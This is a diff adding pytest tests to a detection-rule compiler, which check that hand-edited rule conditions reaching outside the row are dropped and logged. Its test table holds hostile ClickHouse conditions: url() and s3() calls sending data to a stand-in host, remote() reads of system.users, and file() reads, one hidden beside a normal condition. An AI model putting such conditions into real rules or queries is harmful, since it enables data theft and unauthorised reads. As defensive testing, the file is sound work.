@@ -236,6 +236,56 @@ def test_a_rule_with_no_detection_logic_is_dropped(tmp_path: Path):
     )
 
 
+# One refused call per family. A rule YAML can be committed straight into the
+# deploy repo, so the API's refusal is not the only gate the condition passes.
+OFFBOX_CONDITIONS = {
+    "url": "url('http://203.0.113.9/leak', 'LineAsString') = 1",
+    "s3": "s3('https://203.0.113.9/bucket/key', 'CSV') = 1",
+    "file": "file('hostname') LIKE '%a%'",
+    "remote": "remote('203.0.113.9', system.users) = 1",
+    "dictionary": "dictGet('tenants', 'name', toUInt64(1)) = 'acme'",
+    "ai": "aiFilter(toString(_json), 'is it bad') = 1",
+    "globalIn": "globalIn(_source, dfe.main)",
+    "beside a real condition": "a = 1 AND url('http://203.0.113.9/') = 1",
+}
+
+
+@pytest.mark.parametrize("where", OFFBOX_CONDITIONS.values(), ids=list(OFFBOX_CONDITIONS))
+def test_a_hand_edited_rule_that_reads_outside_the_row_compiles_nothing(tmp_path: Path, where):
+    _save_rule(tmp_path, rule_id="offbox", name="Off-box", where_clause=where)
+    _save_rule(tmp_path, rule_id="present", name="Present", where_clause="a = 1")
+
+    statements = compile_hunt_queries(
+        {"rules": ["offbox", "present"], "global_source_table_name": "dfe.main"},
+        "h",
+        rules_dir=tmp_path,
+        default_target="dfe.detection",
+    )
+
+    assert [statement.rule_id for statement in statements] == ["present"]
+    assert not any(where in statement.sql for statement in statements)
+    assert not any(where in statement.count_sql for statement in statements)
+
+
+def test_the_dropped_rule_is_logged_with_the_call_it_made(tmp_path: Path):
+    _save_rule(tmp_path, rule_id="offbox", name="Off-box", where_clause=OFFBOX_CONDITIONS["url"])
+    captured: list = []
+    handler_id = logger.add(captured.append, level="ERROR")
+    try:
+        statements = compile_hunt_queries(
+            {"rules": ["offbox"], "global_source_table_name": "dfe.main"},
+            "h",
+            rules_dir=tmp_path,
+            default_target="dfe.detection",
+        )
+    finally:
+        logger.remove(handler_id)
+
+    assert statements == []
+    assert len(captured) == 1
+    assert "may not call url()" in captured[0].record["message"]
+
+
 def test_a_rule_with_no_source_is_dropped(tmp_path: Path):
     _save_rule(tmp_path, rule_id="nosource", name="No source", where_clause="a = 1")
     assert (
